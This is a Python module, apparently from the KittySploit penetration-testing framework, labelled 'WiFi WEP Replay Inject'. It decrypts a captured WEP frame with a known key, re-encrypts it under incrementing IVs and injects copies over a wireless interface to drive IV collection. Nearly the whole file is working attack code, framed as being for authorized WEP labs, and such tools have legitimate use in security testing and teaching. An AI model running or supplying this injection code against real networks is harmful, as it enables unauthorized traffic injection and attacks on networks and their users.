#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""WEP ARP-style replay with incremented IV (known key, authorized lab)."""

from __future__ import annotations
from pathlib import Path
from kittysploit import *
from lib.protocols.wlan.wep_replay import random_iv, replay_from_capture
from lib.protocols.wlan.wlan_client import Wlan_client


class Module(Auxiliary, Wlan_client):
    __info__ = {
        "name": "WiFi WEP Replay Inject",
        "description": (
            "Decrypt a captured WEP frame with a known key, re-encrypt with a new IV, "
            "and inject to stimulate IV collection on legacy WEP labs."
        ),
        "author": ["KittySploit Team"],
        "tags": ["wlan", "wifi", "wep", "replay"],
        "references": ["https://attack.mitre.org/techniques/T1040/"],
        "attack": {"prerequisites": ["Known WEP key", "Authorized WEP lab AP"]},
    }

    pcap_frame = OptFile("", "PCAP with one WEP data frame", required=True)
    wep_key = OptString("", "5 or 13 byte ASCII key (or hex)", required=True)
    repeats = OptInteger(10, "Injection count", required=False)

    def check(self):
        if not Path(str(self.pcap_frame or "")).is_file():
            print_error("PCAP required")
            return False
        return self.wlan_check_iface()

    def run(self):
        key_raw = str(self.wep_key or "").strip()
        key = key_raw.encode("latin-1")
        if len(key) == 10 and all(c in "0123456789abcdefABCDEF" for c in key_raw):
            key = bytes.fromhex(key_raw)
        if len(key) not in (5, 13):
            print_error("WEP key must be 5 or 13 bytes")
            return False

        sample_frame = None
        for raw in self.wlan_iter_pcap(str(self.pcap_frame)):
            sample_frame = raw
            break
        if not sample_frame:
            print_error("Empty PCAP")
            return False

        reps = max(1, int(self.repeats or 10))
        iv = random_iv()
        sent = 0
        for _ in range(reps):
            frame = replay_from_capture(sample_frame, key, new_iv=iv)
            if not frame:
                print_error("Could not build replay frame — check key / WEP frame")
                return False
            sent += self.wlan_inject_raw([frame], count=1)
            iv = (int.from_bytes(iv, "big") + 1).to_bytes(3, "big")

        print_success(f"Injected {sent} WEP replay frame(s)")
        return sent > 0